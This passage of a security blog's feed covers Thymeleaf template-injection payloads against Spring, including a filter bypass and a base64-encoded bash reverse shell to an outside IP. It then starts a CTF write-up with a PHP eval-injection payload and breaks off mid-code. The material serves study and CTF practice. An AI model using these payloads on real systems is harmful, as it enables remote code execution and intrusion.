aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置了<code>ResponseBody</code>注解后，在<code>applyDefaultViewName</code>中<code>ModelAndView</code>是<code>Null</code>而非<code>ModelAndView</code>对象，所以<code>hasView()</code>会导致异常，不会设置视图名</p><p>原因是设置了<code>ResponseBody</code>注解后，handler返回的是<code>RequestResponseBodyMethodProcesser</code>，所以这里会调用它的<code>handleReturnValue</code>，设置了<code>RequestHandled</code>属性为True</p><p>此方法也适用于<code>templatename</code>，在设置了<code>RequestHandled</code>属性后，<code>ModelAndView</code>一定会返回Null</p><p>这样 spring 框架就不会将其解析为视图名，而是直接返回，不再调用模板解析</p><hr><h2 id="通过redirect"><a href="#通过redirect" class="headerlink" title="通过redirect:"></a>通过redirect:</h2><blockquote><p>根据springboot定义，如果名称以<code>redirect:</code>开头，则不再调用<code>ThymeleafView</code>解析，调用<code>RedirectView</code>去解析<code>controller</code>的返回值</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/safe/redirect"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"redirect:"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span> <span class="token comment">//FP as redirects are not resolved as expressions</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="方法参数中设置HttpServletResponse-参数"><a href="#方法参数中设置HttpServletResponse-参数" class="headerlink" title="方法参数中设置HttpServletResponse 参数"></a>方法参数中设置HttpServletResponse 参数</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析</p><hr><h1 id="其它姿势"><a href="#其它姿势" class="headerlink" title="其它姿势"></a>其它姿势</h1><h2 id="位置"><a href="#位置" class="headerlink" title="::位置"></a>::位置</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">::</span><span class="token function">__</span>$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="省略"><a href="#省略" class="headerlink" title="省略__"></a>省略__</h2><p>当Controller如下配置时，可以省略<code>__</code>包裹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path2</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> lang<span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即去掉了前后缀</p><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span><span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="高版本下的bypass"><a href="#高版本下的bypass" class="headerlink" title="高版本下的bypass"></a>高版本下的bypass</h1><p>在<strong>3.0.12</strong>版本，Thymeleaf 在 <code>util</code>目录下增加了一个名为<code>SpringStandardExpressionUtils.java</code>的文件</p><p>当调用表达式的时候，会经过该函数的判断：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">containsSpELInstantiationOrStatic</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> expression<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> explen <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> explen<span class="token punctuation">;</span>        <span class="token keyword">int</span> ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// index for computing position in the NEW_ARRAY</span>        <span class="token keyword">int</span> si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">&lt;</span> <span class="token constant">NEW_LEN</span>                    <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token constant">NEW_ARRAY</span><span class="token punctuation">[</span>ni<span class="token punctuation">]</span>                    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> explen<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isWhitespace</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                ni<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">==</span> <span class="token constant">NEW_LEN</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// we found an object instantiation</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                n <span class="token operator">+=</span> ni<span class="token punctuation">;</span>                ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// This has to be restarted too</span>                    si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">')'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                si <span class="token operator">=</span> n<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token char">'('</span>                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'T'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到其主要逻辑是：首先倒序检测是否包含<code>wen</code>关键字、在<code>(</code>的左边的字符是否是<code>T</code>，如包含，那么认为找到了一个实例化对象，返回<code>true</code>，阻止该表达式的执行</p><p>因此要绕过这个函数，只要满足三点：<br>1、表达式中不能含有关键字<code>new</code><br>2、在<code>(</code>的左边的字符不能是<code>T</code><br>3、不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</p><p>关于这个的绕过方法是<code>%20</code>，<code>%0a</code>，<code>%09</code></p><p>最终payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token punctuation">;</span><span class="token operator">/</span>__$<span class="token punctuation">&#123;</span><span class="token function">t</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getruntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token comment">//__$&#123;t(java.lang.runtime).getruntime().exec("calc")&#125;__::.x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：命令执行的payload 中不能含有<code>/</code></p><hr><h1 id="2-x版本"><a href="#2-x版本" class="headerlink" title="2.x版本"></a>2.x版本</h1><p>片段表达式 <code>~&#123; &#125;</code>这个特性是在 3.0 版本引入的，但是其实 2.x 版本也能触发漏洞</p><p>同样存在 preprocess 方法来处理预处理表达式</p><p>对于不含预处理表达式的 payload, 同样能够执行, 只是位置不太一样</p><hr><h1 id="其它的payload"><a href="#其它的payload" class="headerlink" title="其它的payload"></a>其它的payload</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token function">x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token function">x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.0.15版本，来自于rwctf2024</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token punctuation">[</span>$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Boolean</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.ObjectMapper"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span>SpelExpressionParser</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"T(Runtime).getRuntime().exec('whoami')"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name"><span class="token namespace">th:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzI5OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;')&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>pepito<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;趁热打铁，昨天刚学完thymeleaf引擎今天直接上注入&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/10514&quot;&gt;https://xz.aliyun.com/t/10514&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/254519&quot;&gt;https://www.anquanke.com/post/id/254519&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/&quot;&gt;https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnpanda.net/sec/1063.html&quot;&gt;https://www.cnpanda.net/sec/1063.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>XGCTF西瓜杯</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/</id>
    <published>2024-07-06T10:50:11.000Z</published>
    <updated>2024-07-09T16:33:01.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web和pwn最分不开的一集</p><p>官方wp：<a href="https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1">https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1</a></p><p>草，一个最新最热cve分别出了一个web题和一个pwn题</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CodeInject"><a href="#CodeInject" class="headerlink" title="CodeInject"></a>CodeInject</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#Author: h1xa</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump((Object)<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>eval命令注入，直接闭合前面的代码即可</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">111)?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls /'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706185318017.png" alt="image-20240706185318017"></p><hr><h2 id="tpdoor（复现）"><a href="#tpdoor（复现）" class="headerlink" title="tpdoor（复现）"></a>tpdoor（复现）</h2><blockquote><p>thinkphp8</p></blockquote><p>tp框架，只给了个index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>facade<span class="token punctuation">\</span>Db</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$middleware</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'think\middleware\AllowCrossDomain'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\CheckRequestCache'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\LoadLangPack'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\SessionInit'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$isCache</span> <span class="token operator">=</span> <span class="token constant boolean">false</span> <span class="token punctuation">,</span> <span class="token variable">$cacheTime</span> <span class="token operator">=</span> <span class="token number">3600</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isCache</span> <span class="token operator">==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">require</span>  <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../../config/route.php'</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_key'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$isCache</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$cacheTime</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_except'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../../config/route.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php return '</span><span class="token operator">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token 